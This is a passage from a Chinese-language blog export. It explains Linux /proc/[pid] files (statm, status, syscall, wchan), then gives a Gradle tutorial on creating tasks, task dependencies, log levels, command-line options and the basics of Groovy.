<h2 id="statm"><a href="#statm" class="headerlink" title="statm"></a>statm</h2><p><code>/proc/[pid]/statm</code>显示进程所占用内存大小的统计信息，包含七个值，度量单位是<code>page</code>（<code>page</code>大小可通过<code>getconf PAGESIZE</code>得到）。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/2948/statm  </span></span><br><span class="line">72362 12945 4876 569 0 24665 0</span><br></pre></td></tr></table></figure>


<p>各个值含义：<br>    a）进程占用的总的内存；<br>    b）进程当前时刻占用的物理内存；<br>    c）同其它进程共享的内存；<br>    d）进程的代码段；<br>    e）共享库（从<code>2.6</code>版本起，这个值为<code>0</code>）；<br>    f）进程的堆栈；<br>    g）<code>dirty pages</code>（从<code>2.6</code>版本起，这个值为<code>0</code>）。  </p>
<h2 id="status"><a href="#status" class="headerlink" title="status"></a>status</h2><p><code>/proc/[pid]/status</code>包含进程的状态信息。其很多内容与<code>/proc/[pid]/stat</code>和<code>/proc/[pid]/statm</code>，但是却是以一种更清晰地方式展现出来。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/$$/status</span></span><br><span class="line">Name:   bash</span><br><span class="line">Umask:  0022</span><br><span class="line">State:  S (sleeping)</span><br><span class="line">Tgid:   15694</span><br><span class="line">Ngid:   0</span><br><span class="line">Pid:    15694</span><br><span class="line">PPid:   15692</span><br><span class="line">TracerPid:      0</span><br><span class="line">Uid:    0       0       0       0</span><br><span class="line">Gid:    0       0       0       0</span><br><span class="line">FDSize: 256</span><br><span class="line">Groups: 0 1 2 3 4 6 10 19</span><br><span class="line">NStgid: 15694</span><br><span class="line">NSpid:  15694</span><br><span class="line">NSpgid: 15694</span><br><span class="line">NSsid:  15694</span><br><span class="line">VmPeak:    26040 kB</span><br><span class="line">VmSize:    26040 kB</span><br><span class="line">VmLck:         0 kB</span><br><span class="line">VmPin:         0 kB</span><br><span class="line">VmHWM:      5412 kB</span><br><span class="line">VmRSS:      5412 kB</span><br><span class="line">RssAnon:            2272 kB</span><br><span class="line">RssFile:            3140 kB</span><br><span class="line">RssShmem:              0 kB</span><br><span class="line">VmData:     2244 kB</span><br><span class="line">VmStk:       132 kB</span><br><span class="line">VmExe:       792 kB</span><br><span class="line">VmLib:      2732 kB</span><br><span class="line">VmPTE:        68 kB</span><br><span class="line">VmPMD:        12 kB</span><br><span class="line">VmSwap:        0 kB</span><br><span class="line">HugetlbPages:          0 kB</span><br><span class="line">Threads:        1</span><br><span class="line">SigQ:   0/11753</span><br><span class="line">SigPnd: 0000000000000000</span><br><span class="line">ShdPnd: 0000000000000000</span><br><span class="line">SigBlk: 0000000000010000</span><br><span class="line">SigIgn: 0000000000380004</span><br><span class="line">SigCgt: 000000004b817efb</span><br><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 0000003fffffffff</span><br><span class="line">CapEff: 0000003fffffffff</span><br><span class="line">CapBnd: 0000003fffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br><span class="line">NoNewPrivs:     0</span><br><span class="line">Seccomp:        0</span><br><span class="line">Cpus_allowed:   f</span><br><span class="line">Cpus_allowed_list:      0-3</span><br><span class="line">Mems_allowed:   00000000,00000001</span><br><span class="line">Mems_allowed_list:      0</span><br><span class="line">voluntary_ctxt_switches:        1045</span><br><span class="line">nonvoluntary_ctxt_switches:     30</span><br></pre></td></tr></table></figure>
<p>关于信号（<code>signal</code>）的信息：<code>SigQ</code>分为两部分（例如<code>0/11753</code>），前面表示当前处在队列中的信号（<code>0</code>），后面则表示队列一共可以存储多少信号（<code>11753</code>）；<code>SigPnd</code>表示当前线程<code>pending</code>的信号，而<code>ShdPnd</code>则表示整个进程<code>pending</code>的信号；<code>SigBlk</code>、<code>SigIgn</code>和<code>SigCgt</code>分别表示对信号的处理是阻塞，忽略，还是捕获。（关于<code>Unix</code>信号的相关知识，可以参考<a href="https://www.networkworld.com/article/3211296/linux/unix-dealing-with-signals.html">Unix: Dealing with signals</a>）。</p>
<h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p><code>/proc/[pid]/syscall</code>显示当前进程正在执行的系统调用。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/2948/syscall</span></span><br><span class="line">7 0x7f4a452cbe70 0xb 0x1388 0xffffffffffdff000 0x7f4a4274a750 0x0 0x7ffd1a8033f0 0x7f4a41ff2c1d</span><br></pre></td></tr></table></figure>

<p>第一个值是系统调用号（<code>7</code>代表<code>poll</code>），后面跟着<code>6</code>个系统调用的参数值（位于寄存器中），最后两个值依次是堆栈指针和指令计数器的值。如果当前进程虽然阻塞，但阻塞函数并不是系统调用，则系统调用号的值为<code>-1</code>，后面只有堆栈指针和指令计数器的值。如果进程没有阻塞，则这个文件只有一个“<code>running</code>”的字符串。</p>
<p>内核编译时打开了<code>CONFIG_HAVE_ARCH_TRACEHOOK</code>编译选项，才会生成这个文件。  </p>
<h2 id="wchan"><a href="#wchan" class="headerlink" title="wchan"></a>wchan</h2><p><code>/proc/[pid]/wchan</code>显示当进程<code>sleep</code>时，<code>kernel</code>当前运行的函数。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/2948/wchan</span></span><br><span class="line">kauditd_thread</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>gradle学习</title>
    <url>/2019/11/20/gradle%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#1-%E5%AE%89%E8%A3%85gradle">1. 安装<code>gradle</code></a></li>
<li><a href="#2-%E5%85%A5%E9%97%A8%E5%89%8D%E5%A5%8F">2. 入门前奏</a><ul>
<li><a href="#21-%E5%AE%9E%E7%8E%B0-hello-world">2.1. 实现 <code>hello world</code></a></li>
<li><a href="#22-gradle-%E7%9A%84%E4%BB%BB%E5%8A%A1">2.2. <code>gradle</code> 的任务</a><ul>
<li><a href="#221-%E5%88%9B%E5%BB%BA%E4%BB%BB%E5%8A%A1">2.2.1. 创建任务</a><ul>
<li><a href="#2211-%E7%9B%B4%E6%8E%A5%E7%94%A8%E4%BB%BB%E5%8A%A1%E5%90%8D%E7%A7%B0%E5%88%9B%E5%BB%BA">2.2.1.1. 直接用任务名称创建</a></li>
<li><a href="#2212-%E4%BB%BB%E5%8A%A1%E5%90%8D%E7%A7%B0%E4%BB%BB%E5%8A%A1%E9%85%8D%E7%BD%AE%E5%88%9B%E5%BB%BA">2.2.1.2. 任务名称+任务配置创建</a></li>
<li><a href="#2213-taskcontainer%E7%9A%84create%E6%96%B9%E6%B3%95%E5%88%9B%E5%BB%BA">2.2.1.3. TaskContainer的create方法创建</a></li>
</ul>
</li>
<li><a href="#222-%E4%BB%BB%E5%8A%A1%E4%BE%9D%E8%B5%96">2.2.2. 任务依赖</a><ul>
<li><a href="#2221-%E5%8A%A8%E6%80%81%E5%AE%9A%E4%B9%89%E4%BB%BB%E5%8A%A1">2.2.2.1. 动态定义任务</a></li>
</ul>
</li>
<li><a href="#223-%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%86%E7%BB%84%E5%92%8C%E6%8F%8F%E8%BF%B0">2.2.3. 任务的分组和描述</a></li>
</ul>
</li>
<li><a href="#23-gradle-%E6%97%A5%E5%BF%97%E7%BA%A7%E5%88%AB">2.3. <code>Gradle</code> 日志级别</a></li>
<li><a href="#24-gradle-%E5%91%BD%E4%BB%A4%E8%A1%8C">2.4. <code>Gradle</code> 命令行</a><ul>
<li><a href="#241-%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E4%BB%BB%E5%8A%A1%E4%BF%A1%E6%81%AF">2.4.1. 获取所有任务信息</a></li>
<li><a href="#242-%E6%8E%92%E9%99%A4%E4%BB%BB%E5%8A%A1">2.4.2. 排除任务</a></li>
<li><a href="#243-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E8%B0%83%E7%94%A8">2.4.3. 多任务调用</a></li>
<li><a href="#244-%E4%BB%BB%E5%8A%A1%E5%90%8D%E7%A7%B0%E7%BC%A9%E5%86%99">2.4.4. 任务名称缩写</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#3-groovy-%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97">3. Groovy 快速入门指南</a><ul>
<li><a href="#groovy-%E6%A6%82%E8%BF%B0">Groovy 概述</a></li>
<li><a href="#groovy%E7%BC%96%E5%86%99%E5%92%8C%E8%B0%83%E8%AF%95">Groovy编写和调试</a></li>
<li><a href="#%E5%8F%98%E9%87%8F">变量</a></li>
<li><a href="#%E6%96%B9%E6%B3%95">方法</a></li>
<li><a href="#%E7%B1%BB">类</a></li>
</ul>
</li>
</ul>
<!-- /TOC -->


<h1 id="1-安装gradle"><a href="#1-安装gradle" class="headerlink" title="1. 安装gradle"></a>1. 安装<code>gradle</code></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo apt install gradle</span><br><span class="line"></span><br><span class="line">➜  ~ gradle -v</span><br><span class="line">WARNING: An illegal reflective access operation has occurred</span><br><span class="line">WARNING: Illegal reflective access by org.codehaus.groovy.reflection.CachedClass (file:/usr/share/java/groovy-all.jar) to method java.lang.Object.finalize()</span><br><span class="line">WARNING: Please consider reporting this to the maintainers of org.codehaus.groovy.reflection.CachedClass</span><br><span class="line">WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations</span><br><span class="line">WARNING: All illegal access operations will be denied in a future release</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------</span><br><span class="line">Gradle 4.4.1</span><br><span class="line">------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Build time:   2012-12-21 00:00:00 UTC</span><br><span class="line">Revision:     none</span><br><span class="line"></span><br><span class="line">Groovy:       2.4.16</span><br><span class="line">Ant:          Apache Ant(TM) version 1.10.5 compiled on March 28 2019</span><br><span class="line">JVM:          11.0.4 (Ubuntu 11.0.4+11-post-Ubuntu-1ubuntu218.04.3)</span><br><span class="line">OS:           Linux 5.0.0-36-generic amd64</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="2-入门前奏"><a href="#2-入门前奏" class="headerlink" title="2. 入门前奏"></a>2. 入门前奏</h1><h2 id="2-1-实现-hello-world"><a href="#2-1-实现-hello-world" class="headerlink" title="2.1. 实现 hello world"></a>2.1. 实现 <code>hello world</code></h2><p>新建一个目录，例如 <code>gradle01</code> ,在这个目录中新建一个 <code>build.gradle</code> 文件，输入以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">task hello &#123;</span><br><span class="line">    doLast&#123;</span><br><span class="line">        println &quot;hello world&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行 <code>gradle -q hello</code> 命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  gradle01 gradle -q hello</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
<p> <code>task</code> （任务）和action(动作)是 <code>Gradle</code> 的重要元素。上面的代码中， <code>task</code> 代表一个独立的原子性操作，比如复制一个文件，编译一次Java代码，这里我们简单的定义一个名为 <code>hello</code> 的任务。 <code>doLast</code> 代表<code>task</code> 执行的最后一个 <code>action</code>，通俗来讲就是 <code>task</code> 执行完毕后会回调 <code>doLast</code> 中的代码，在上面这个例子中就会打印 <code>Hello world!</code> 。</p>
<p>上面的例子可以写的更简洁一些：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">task hello &lt;&lt; &#123;</span><br><span class="line">    println &quot;Hello world&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-gradle-的任务"><a href="#2-2-gradle-的任务" class="headerlink" title="2.2. gradle 的任务"></a>2.2. <code>gradle</code> 的任务</h2><p>为了更好的讲解后面的Gradle 命令行，这里简单的介绍下Gradle的任务，包括创建任务、任务依赖、 动态定义任务和任务的分组和描述。</p>
<h3 id="2-2-1-创建任务"><a href="#2-2-1-创建任务" class="headerlink" title="2.2.1. 创建任务"></a>2.2.1. 创建任务</h3><p>除了前面实现 <code>Hello World</code> 的例子采用的创建任务方式，还有其他的3种创建任务方式。</p>
<h4 id="2-2-1-1-直接用任务名称创建"><a href="#2-2-1-1-直接用任务名称创建" class="headerlink" title="2.2.1.1. 直接用任务名称创建"></a>2.2.1.1. 直接用任务名称创建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def Task hello = task(hello)</span><br><span class="line">hello.doLast&#123;</span><br><span class="line">    println &quot;hello world&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-1-2-任务名称-任务配置创建"><a href="#2-2-1-2-任务名称-任务配置创建" class="headerlink" title="2.2.1.2. 任务名称+任务配置创建"></a>2.2.1.2. 任务名称+任务配置创建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def Task hello =  task(hello, group:BasePlugin.BUILD_GROUP)</span><br><span class="line">hello.doLast&#123;</span><br><span class="line">    println &quot;hello world&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 <code>group</code> 为任务配置项，它代表了分组。</p>
<h4 id="2-2-1-3-TaskContainer的create方法创建"><a href="#2-2-1-3-TaskContainer的create方法创建" class="headerlink" title="2.2.1.3. TaskContainer的create方法创建"></a>2.2.1.3. TaskContainer的create方法创建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasks.create(name: &quot;hello&quot;) &lt;&lt; &#123;</span><br><span class="line">    println &quot;hello world&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-2-任务依赖"><a href="#2-2-2-任务依赖" class="headerlink" title="2.2.2. 任务依赖"></a>2.2.2. 任务依赖</h3><p>任务依赖会决定任务运行的先后顺序，被依赖的任务会在定义依赖的任务之前执行。创建任务间的依赖关系如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">task hello &lt;&lt; &#123;</span><br><span class="line">    println &quot;hello world&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">task go(dependsOn: hello) &lt;&lt; &#123;</span><br><span class="line">    println &quot;go for it&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>hello</code> 任务的基础上增加了一个名为 <code>go</code> 的任务，通过 <code>dependsOn</code> 来指定依赖的任务为 <code>hello</code> ，因此 <code>go</code> 任务运行在 <code>hello</code> 之后。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  gradle01 gradle -q go   </span><br><span class="line">hello world</span><br><span class="line">go for it</span><br></pre></td></tr></table></figure>

<h4 id="2-2-2-1-动态定义任务"><a href="#2-2-2-1-动态定义任务" class="headerlink" title="2.2.2.1. 动态定义任务"></a>2.2.2.1. 动态定义任务</h4><p>动态定义任务指的是在运行时来定义任务的名称，如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.times&#123;</span><br><span class="line">    number-&gt;task &quot;task$number&quot; &lt;&lt; &#123;</span><br><span class="line">        println &quot;task$number&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里用到了 <code>Groovy</code> 语法，关于 <code>Groovy</code> 语法会在本系列后续的文章进行介绍。<code>times</code> 是 <code>Groovy</code> 在 <code>java.lang.Number</code> 中拓展的方法，是一个定时器。<code>3.times</code> 中循环创建了三个新任务，隐式变量 <code>number</code> 的值为 <code>0，1，2</code> ，任务的名称由 <code>task</code> 加上 <code>number</code> 的值组成，达到了动态定义任务的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  gradle01 gradle -q task0</span><br><span class="line">task0</span><br><span class="line">➜  gradle01 gradle -q task1</span><br><span class="line">task1</span><br><span class="line">➜  gradle01 gradle -q task2</span><br><span class="line">task2</span><br></pre></td></tr></table></figure>

<h3 id="2-2-3-任务的分组和描述"><a href="#2-2-3-任务的分组和描述" class="headerlink" title="2.2.3. 任务的分组和描述"></a>2.2.3. 任务的分组和描述</h3><p><code>Gradle</code> 有任务组的概念，可以为任务配置分组和描述，以便于更好的管理任务，拥有良好的可读性。改造前面的例子，为 <code>hello</code> 任务添加分组和描述。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">task hello &#123;</span><br><span class="line">    group = &quot;build&quot;</span><br><span class="line">    description = &quot;hello world&quot;</span><br><span class="line">    doLast&#123;</span><br><span class="line">        println &quot;任务分组： $&#123;group&#125;&quot;</span><br><span class="line">        println &quot;任务描述： $&#123;description&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">task go(dependsOn: hello) &lt;&lt; &#123;</span><br><span class="line">    println &quot;go for it&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者采用创建任务的方式来为任务添加分组和描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def Task hello = task(hello)</span><br><span class="line">hello.description = &quot;hello world&quot;</span><br><span class="line">hello.group = BasePlugin.BUILD_GROUP</span><br><span class="line">hello.doLast&#123;</span><br><span class="line">    println &quot;任务分组: $&#123;group&#125;&quot;</span><br><span class="line">    println &quot;任务描述: $&#123;description&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">task go(dependsOn: hello)&#123;</span><br><span class="line">    println &quot;go for it&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终执行结果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  gradle01 gradle -q go</span><br><span class="line">go for it</span><br><span class="line">任务分组: build</span><br><span class="line">任务描述: hello world</span><br></pre></td></tr></table></figure>

<h2 id="2-3-Gradle-日志级别"><a href="#2-3-Gradle-日志级别" class="headerlink" title="2.3. Gradle 日志级别"></a>2.3. <code>Gradle</code> 日志级别</h2><p>和Android一样，Gradle也定义了日志级别。</p>
<table>
<thead>
<tr>
<th>级别</th>
<th>用于</th>
</tr>
</thead>
<tbody><tr>
<td>ERROR</td>
<td>错误消息</td>
</tr>
<tr>
<td>QUIET</td>
<td>重要的信息消息</td>
</tr>
<tr>
<td>WARNING</td>
<td>警告消息</td>
</tr>
<tr>
<td>LIFECYCLE</td>
<td>进度信息消息</td>
</tr>
<tr>
<td>INFO</td>
<td>信息性消息</td>
</tr>
<tr>
<td>DEBUG</td>
<td>调试消息</td>
</tr>
</tbody></table>
<p>前面我们通过 <code>gradle -q</code> + 任务名称来运行一个指定的 <code>task</code> ，这个 <code>q</code> 是命令行开关选项，通过开关选项可以控制输出的日志级别。</p>
<table>
<thead>
<tr>
<th>开关选项</th>
<th>输出日志级别</th>
</tr>
</thead>
<tbody><tr>
<td>无日志选项</td>
<td>LIFECYCLE及更高级别</td>
</tr>
<tr>
<td>-q或者 –quiet</td>
<td>QUIET及更高级别</td>
</tr>
<tr>
<td>-i或者 –info</td>
<td>INFO及更高级别</td>
</tr>
<tr>
<td>-d或者 –debug</td>
<td>DEBUG及更高级别</td>
</tr>
</tbody></table>
<h2 id="2-4-Gradle-命令行"><a href="#2-4-Gradle-命令行" class="headerlink" title="2.4. Gradle 命令行"></a>2.4. <code>Gradle</code> 命令行</h2><h3 id="2-4-1-获取所有任务信息"><a href="#2-4-1-获取所有任务信息" class="headerlink" title="2.4.1. 获取所有任务信息"></a>2.4.1. 获取所有任务信息</h3><p>这一节的命令行前面<a href="#223-%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%86%E7%BB%84%E5%92%8C%E6%8F%8F%E8%BF%B0">2.2.3. 任务的分组和描述</a>的代码为例，此前我们通过 <code>gradle -q +</code> 任务名称来运行一个指定的任务，如果不知道任务的名称，可以通过运行 <code>gradle -q tasks</code> 命令来获取所有的任务信息，这样就不需要打开源码了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  gradle01 gradle -a tasks</span><br><span class="line">--no-rebuild/-a has been deprecated and is scheduled to be removed in Gradle 5.0.</span><br><span class="line"></span><br><span class="line">&gt; Configure project : </span><br><span class="line">go for it</span><br><span class="line"></span><br><span class="line">&gt; Task :tasks </span><br><span class="line"></span><br><span class="line">------------------------------------------------------------</span><br><span class="line">All tasks runnable from root project</span><br><span class="line">------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Build tasks</span><br><span class="line">-----------</span><br><span class="line">hello - hello world</span><br><span class="line"></span><br><span class="line">Build Setup tasks</span><br><span class="line">-----------------</span><br><span class="line">init - Initializes a new Gradle build.</span><br><span class="line">wrapper - Generates Gradle wrapper files.</span><br><span class="line"></span><br><span class="line">Help tasks</span><br><span class="line">----------</span><br><span class="line">buildEnvironment - Displays all buildscript dependencies declared in root project &#x27;gradle01&#x27;.</span><br><span class="line">components - Displays the components produced by root project &#x27;gradle01&#x27;. [incubating]</span><br><span class="line">dependencies - Displays all dependencies declared in root project &#x27;gradle01&#x27;.</span><br><span class="line">dependencyInsight - Displays the insight into a specific dependency in root project &#x27;gradle01&#x27;.</span><br><span class="line">dependentComponents - Displays the dependent components of components in root project &#x27;gradle01&#x27;. [incubating]</span><br><span class="line">help - Displays a help message.</span><br><span class="line">model - Displays the configuration model of root project &#x27;gradle01&#x27;. [incubating]</span><br><span class="line">projects - Displays the sub-projects of root project &#x27;gradle01&#x27;.</span><br><span class="line">properties - Displays the properties of root project &#x27;gradle01&#x27;.</span><br><span class="line">tasks - Displays the tasks runnable from root project &#x27;gradle01&#x27;.</span><br><span class="line"></span><br><span class="line">To see all tasks and more detail, run gradle tasks --all</span><br><span class="line"></span><br><span class="line">To see more detail about a task, run gradle help --task &lt;task&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL in 0s</span><br><span class="line">1 actionable task: 1 executed</span><br></pre></td></tr></table></figure>
<p>默认情况下，只会显示那些被分组的任务的名称和描述。比如 <code>Build tasks</code> （<code>Build</code> 任务组）中有我们定义的 <code>hello</code> 任务，<code>Build Setup tasks</code> 中有 <code>init</code> 和 <code>wrapper</code> ，<code>Help tasks</code> 有<code>buildEnvironment</code> 和 <code>components</code> 等等。</p>
<h3 id="2-4-2-排除任务"><a href="#2-4-2-排除任务" class="headerlink" title="2.4.2. 排除任务"></a>2.4.2. 排除任务</h3><p>如果我们不想运行go任务，可以运行 <code>gradle hello -x go</code> 命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  gradle01 gradle hello -x go</span><br><span class="line"></span><br><span class="line">&gt; Configure project : </span><br><span class="line">go for it</span><br><span class="line"></span><br><span class="line">&gt; Task :hello </span><br><span class="line">任务分组: build</span><br><span class="line">任务描述: hello world</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL in 0s</span><br><span class="line">1 actionable task: 1 executed</span><br></pre></td></tr></table></figure>

<p>获取任务帮助信息</p>
<p>通过运行 <code>gradle -q help --task hello</code> 命令来显示 <code>hello</code> 任务的帮助信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  gradle01 gradle -q help --task hello</span><br><span class="line">go for it</span><br><span class="line">Detailed task information for hello</span><br><span class="line"></span><br><span class="line">Path</span><br><span class="line">     :hello</span><br><span class="line"></span><br><span class="line">Type</span><br><span class="line">     Task (org.gradle.api.Task)</span><br><span class="line"></span><br><span class="line">Description</span><br><span class="line">     hello world</span><br><span class="line"></span><br><span class="line">Group</span><br><span class="line">     build</span><br></pre></td></tr></table></figure>
<p>可以看到hello任务的路径、类型、描述和分组。</p>
<h3 id="2-4-3-多任务调用"><a href="#2-4-3-多任务调用" class="headerlink" title="2.4.3. 多任务调用"></a>2.4.3. 多任务调用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">task helloworld &lt;&lt;&#123;</span><br><span class="line">    println &quot;hello world!&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">task goforit &lt;&lt; &#123;</span><br><span class="line">    println &quot;go for it!&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过命令行一次执行多个任务，每个任务通常只会执行一次，无论是在命令行中指定任务还是任务依赖。上面的例子我们运行 <code>gradle helloWorld goForit</code> ，会先执行<code>helloWorld</code> 任务后执行 <code>goforit</code> 任务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  gradle01 gradle helloworld goforit</span><br><span class="line"></span><br><span class="line">&gt; Configure project : </span><br><span class="line">The Task.leftShift(Closure) method has been deprecated and is scheduled to be removed in Gradle 5.0. Please use Task.doLast(Action) instead.</span><br><span class="line"></span><br><span class="line">&gt; Task :helloworld </span><br><span class="line">hello world!</span><br><span class="line"></span><br><span class="line">&gt; Task :goforit </span><br><span class="line">go for it!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL in 0s</span><br><span class="line">2 actionable tasks: 2 executed</span><br></pre></td></tr></table></figure>
<h3 id="2-4-4-任务名称缩写"><a href="#2-4-4-任务名称缩写" class="headerlink" title="2.4.4. 任务名称缩写"></a>2.4.4. 任务名称缩写</h3><p>可以对使用驼峰命名的任务进行缩写，对于名称特别长的任务这个特性非常有用，比如<a href="#243-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E8%B0%83%E7%94%A8">2.4.3. 多任务调用</a>中的例子只需要执行<code>gradle hW gF</code> 就可以了，不过需要注意一点，那就是任务名称的缩写必须是唯一的，如果<a href="#243-%E5%A4%9A%E4%BB%BB%E5%8A%A1%E8%B0%83%E7%94%A8">2.4.3. 多任务调用</a>中第二个任务的名称为<code>helloWangshu</code>，那么就会报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  gradle01 gradle hW gF</span><br><span class="line"></span><br><span class="line">&gt; Configure project : </span><br><span class="line">The Task.leftShift(Closure) method has been deprecated and is scheduled to be removed in Gradle 5.0. Please use Task.doLast(Action) instead.</span><br><span class="line"></span><br><span class="line">&gt; Task :helloworld </span><br><span class="line">hello world!</span><br><span class="line"></span><br><span class="line">&gt; Task :goforit </span><br><span class="line">go for it!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL in 0s</span><br><span class="line">2 actionable tasks: 2 executed</span><br></pre></td></tr></table></figure>

<h1 id="3-Groovy-快速入门指南"><a href="#3-Groovy-快速入门指南" class="headerlink" title="3. Groovy 快速入门指南"></a>3. Groovy 快速入门指南</h1><h2 id="Groovy-概述"><a href="#Groovy-概述" class="headerlink" title="Groovy 概述"></a>Groovy 概述</h2><p><code>Groovy</code> 是 <code>Apache</code> 旗下的一种基于 <code>JVM</code> 的面向对象编程语言，既可以用于面向对象编程，也可以用作纯粹的脚本语言。在语言的设计上它吸纳了<code>Python</code> 、<code>Ruby</code> 和 <code>Smalltalk</code> 语言的优秀特性，比如动态类型转换、闭包和元编程支持。<br><code>Groovy</code> 与 <code>Java</code> 可以很好的互相调用并结合编程 ，比如在写 <code>Groovy</code> 的时候忘记了语法可以直接按 <code>Java</code> 的语法继续写，也可以在 <code>Java</code>  中调用 <code>Groovy</code>  脚本。比起<code>Java</code>，<code>Groovy</code> 语法更加的灵活和简洁，可以用更少的代码来实现 <code>Java</code> 实现的同样功能。</p>
<h2 id="Groovy编写和调试"><a href="#Groovy编写和调试" class="headerlink" title="Groovy编写和调试"></a>Groovy编写和调试</h2><p><code>Groovy</code> 的代码可以在 <code>Android Studio</code> 和 <code>IntelliJ IDEA</code> 等 <code>IDE</code> 中进行编写和调试，缺点是需要配置环境，这里推荐在文本中编写代码并结合命令行进行调试（文本推荐使用<code>VSCode</code>）。关于命令行请查看<a href="#2-%E5%85%A5%E9%97%A8%E5%89%8D%E5%A5%8F">2. 入门前奏</a>。</p>
<p>具体的操作步骤就是：在一个目录中新建 <code>build.gradle</code> 文件，在 <code>build.gradle</code> 中新建一个 <code>task</code> ，在 <code>task</code> 中编写 <code>Groovy</code> 代码，用命令行进入这个 <code>build.gradle</code> 文件所在的目录，运行 <code>gradle task</code> 名称 等命令行对代码进行调试，本文中的例子都是这样编写和调试的。</p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p><code>Groovy</code> 中用 <code>def</code> 关键字来定义变量，可以不指定变量的类型，默认访问修饰符是 <code>public</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def a = 1;</span><br><span class="line">def int b = 1;</span><br><span class="line">def c = &quot;hello world&quot;;</span><br></pre></td></tr></table></figure>

<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>方法使用返回类型或 <code>def</code> 关键字定义，方法可以接收任意数量的参数，这些参数可以不申明类型，如果不提供可见性修饰符，则该方法为 <code>public</code>。</p>
